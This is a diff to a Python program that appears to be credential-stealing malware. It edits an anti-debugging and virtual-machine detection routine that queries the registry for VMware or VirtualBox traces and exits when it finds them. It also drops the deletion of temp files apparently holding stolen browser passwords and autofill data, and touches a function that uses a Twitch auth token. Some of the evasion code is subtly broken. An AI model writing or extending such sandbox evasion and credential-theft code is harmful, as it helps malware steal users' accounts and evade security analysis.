@@ -66,7 +66,6 @@ def clear_command_prompt():
         os.system('cls')
     else:
         os.system('clear')
-        
 def antidebug():
     checks = [check_username,check_windows, check_ip, checkre, check_dll]
     for check in checks:
@@ -139,16 +138,25 @@ def check_ip():
             pass
         
 def checkre():
-    try:
-        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
-        subkey_count = winreg.QueryInfoKey(key)[0]
-        for i in range(subkey_count):
-            subkey = winreg.EnumKey(key, i)
-            if subkey.startswith('VMWARE'):
-                exit_program('Unvalid')
-        winreg.CloseKey(key)
-    except:
-        pass
+        reg1 = os.system(
+            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
+        )
+        reg2 = os.system(
+            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
+        )
+        if reg1 != 1 and reg2 != 1:
+            os.exit(1)
+
+        handle = winreg.OpenKey(
+            winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
+        )
+        try:
+            reg_val = winreg.QueryValueEx(handle, "0")[0]
+            if ("VMware" or "VBOX") in reg_val:
+                exit_program('VM')
+        finally:
+            winreg.CloseKey(handle)
+
 
 def check_dll():
     sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
@@ -2043,11 +2051,7 @@ def paaz(filetype):
             file2 = os.getenv("TEMP") + f"\wppassw.txt"
             file3 = os.getenv("TEMP") + f"\wpautofill.txt"
             file4 = os.getenv("TEMP") + '\winvs.txt'
-            ss = [file, file2,file3,file4]
-            for item in ss:
-                try:
-                    os.remove(item)
-                except:pass
+
 
         except Exception as e:
             pass
@@ -2473,7 +2477,8 @@ def twitch_session(auth_token, username):
             'Content-Type': 'application/json',
         }
 
-        query = f'''
+        query = f"""
+        
         query {{
             user(login: "{username}") {{
                 id
@@ -2490,8 +2495,7 @@ def twitch_session(auth_token, username):
                 }}
             }}
         }}
-        '''
-        
+        """
 
         data = {
             "query": query
